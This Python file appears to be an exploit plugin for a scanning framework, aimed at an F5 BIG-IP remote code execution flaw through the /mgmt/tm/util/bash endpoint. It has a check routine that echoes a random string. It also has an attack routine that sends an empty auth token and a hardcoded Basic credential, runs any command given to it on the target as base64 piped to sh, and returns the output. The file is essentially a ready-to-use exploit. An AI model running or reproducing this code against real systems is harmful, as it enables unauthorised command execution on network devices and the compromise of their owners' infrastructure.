# -*-* coding:UTF-8
import base64
import json


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "F5 BIG-IP 远程代码执行漏洞",
        "datetime": "2022-01-03"
    }

    def url(self) -> dict:
        """ 验证方法 """
        random_str = self.build_random_str(12)
        r = self.request(
            method='post',
            path='./mgmt/tm/util/bash',
            headers={
                'Content-Type': 'application/json',
                'X-F5-Auth-Token': '',
                'Authorization': 'Basic YWRtaW46QVNhc1M='
            },
            data={'command': "run", 'utilCmdArgs': f"-c 'echo {random_str}'"},
            timeout=15
        )
        if r.status_code == 200 and random_str in r.text:
            return {
                'LoopholeInfo': {'app': "F5 BIG-IP"}
            }

    @cli.options('cmd', desc="执行命令", default="whoami")
    def attack(self, cmd):
        """ 利用方法 """
        r = self.request(
            method='post',
            path='./mgmt/tm/util/bash',
            headers={
                'Content-Type': 'application/json',
                'X-F5-Auth-Token': '',
                'Authorization': 'Basic YWRtaW46QVNhc1M='
            },
            data={'command': "run", 'utilCmdArgs': f"-c 'echo {base64.b64encode(cmd.encode()).decode()}|base64 -d|sh'"},
            timeout=15
        )
        if r.status_code == 200:
            res = json.loads(r.text)['commandResult']
            return res
        else:
            return "failure"
